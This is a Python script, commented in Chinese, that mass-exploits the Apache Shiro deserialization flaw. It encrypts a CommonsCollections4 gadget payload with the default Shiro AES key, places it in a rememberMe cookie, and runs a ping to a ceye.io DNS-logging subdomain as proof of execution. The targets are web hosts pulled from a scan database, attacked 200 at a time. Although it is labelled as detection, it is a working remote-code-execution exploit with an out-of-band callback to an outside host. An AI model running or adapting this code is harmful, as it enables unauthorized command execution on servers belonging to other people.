#coding:utf-8
'''
	shiro-69 远程命令执行漏洞检测
	DNS服务由 http://ceye.io/record/query 提供
'''
from Crypto.Cipher import AES
from Crypto import Random
import os
import base64
import commands
import MySQLdb
import hashlib
import random
import time
import Queue
import threading
from gevent import monkey
from gevent.pool import Pool
from lib.lib import *
import traceback
monkey.patch_all()
import requests


def run(domain,port):
	for suffix in ["/"]:
		if str(port) == "443":
			url = "https://{0}:{1}".format(domain, port)
		else:
			url = "http://{0}:{1}".format(domain, port)
		url = url + suffix
		try:
			hash = "shiro.{0}.{1}.fq1ezq.ceye.io".format(domain, port)
			cmdcheck = "ping {0}".format(hash)
			check = exploitApacheShiro(url, cmdcheck)
    		except requests.RequestException:
			pass
		except Exception as e:
			print(traceback.print_exc())
			#print(e, url)

def check(task):
	ip = task[0]
	port = str(task[1])
	if is_internal_ip(ip):
		return
	print("{0} Scanning: {1}".format(time.strftime("%d:%H:%M", time.localtime(time.time())), ip))
	for domain in getdomainfromip(ip):
		if domain == "" or domain.startswith("IPc"):
			continue
		run(domain,port)

def exploitApacheShiro(url,cmdstr):
    key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==') # Default AES Key for shiro 1.2.4
    payload = generateApacheShiroPayload(cmdstr)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                             'Chrome/45.0.2454.101 Safari/537.36',
               'Cookie': 'rememberMe=%s' % shiroAesEncryption(key, open(payload, 'rb').read()),
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
    #conn = requests.get(url, timeout=10, verify=False, headers=headers,proxies={"http":"127.0.0.1:8085"})
    conn = requests.get(url, timeout=10, verify=False, headers=headers)
    status_conn = conn.status_code
    if os.path.exists(os.path.dirname(os.path.realpath(__file__))+"/"+payload):
        os.remove(os.path.dirname(os.path.realpath(__file__))+"/"+payload)
    if status_conn == 200:
        return "succeed"
    else:
        return "failed"

def shiroAesEncryption(key, text):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
    unpad = lambda s: s[0:-ord(s[-1])]
    IV = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, IV=IV)
    data = base64.b64encode(IV + cipher.encrypt(pad(text)))
    return data

def generateApacheShiroPayload(cmdstr):
    payload = "payload.t4"
    cmd = "java -jar shiro.jar CommonsCollections4 '"+cmdstr+"' > "+payload
    (status, output) = commands.getstatusoutput(cmd)
    if status == 0:
        return payload
    else:
        print("[!] generate payload failed!")
        exit()

task_queue = Queue.Queue()


"""
	检查结束后
"""
def clean():
	pass
"""
	功能测试
	http://ceye.io/record/query 页面中应该有记录
	shiro.127.0.0.1.8089.fq1ezq.ceye.io
"""
def test(ip, port):
	check([ip, port])

def main():
	res = get_from_database(
		"select address,port from blog.scan_scan_port where service like 'http%' or service ='' or service='unknown' or port='80'")
	res = list(set(res))
	print("共检查{0}个IP".format(len(res)))
	random.shuffle(res)
	p = Pool(200)
	p.map(check, res)
if __name__ == "__main__":
	print("String...")
	main()
	print("Finished...")
	clean()
